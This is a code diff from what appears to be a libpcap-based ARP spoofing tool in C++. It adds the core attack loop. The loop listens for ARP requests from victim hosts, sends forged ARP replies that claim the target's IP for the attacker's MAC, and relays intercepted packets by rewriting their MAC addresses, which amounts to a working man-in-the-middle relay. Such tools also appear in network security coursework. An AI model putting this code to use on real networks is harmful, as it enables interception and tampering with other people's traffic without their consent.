@@ -283,8 +283,34 @@ int main(int argc, char* argv[]) {
     startTime = time(NULL);
 
     while (time(NULL)-startTime < durationTime) {
-        printf("spoofing...\n");
-    }
+        struct pcap_pkthdr* header;
+        const uint8_t* packet;
+    	res = pcap_next_ex(handle, &header, &packet);
+
+        if (res == 0) continue;
+        if (res == -1 || res == -2) {
+            printf("ERROR: pcap_next_ex return %d error=%s\n", res,
+                   pcap_geterr(handle));
+            return -1;
+        }
+
+        EthHdr* replyEthernet = (EthHdr*)packet;
+        ArpHdr* replyArp = (ArpHdr*)(packet + sizeof(EthHdr));
+
+       	for (int i=0 ; (argc-3)/2 > i ; i++) {
+            if (replyEthernet->type() == EthHdr::Arp && replyArp->op() == ArpHdr::Request && replyEthernet->smac() == macMap.find(senderIp[i])->second) {
+            	res = sendArpReply(handle, myMac, targetIp[i], macMap.find(senderIp[i])->second, senderIp[i]);
+	            if (res != 0) {
+	                printf("ERROR: pcap_sendpacket return %d error=%s\n", res,
+	                       pcap_geterr(handle));
+	                return -1;
+            	}
+            } else if (replyEthernet->smac() == macMap.find(senderIp[i])->second) {
+		       	memcpy((void*)packet, macMap.find(targetIp[i])->second, sizeof(Mac));
+	        	pcap_sendpacket(handle, packet, sizeof(EthHdr) + packet[16]*0x0100 + packet[17]*0x001);
+	        }
+		}
+	}
 
     for (int i=0 ; (argc-3)/2 > i ; i++) {
         if (macMap.end() != macMap.find(senderIp[i])) {
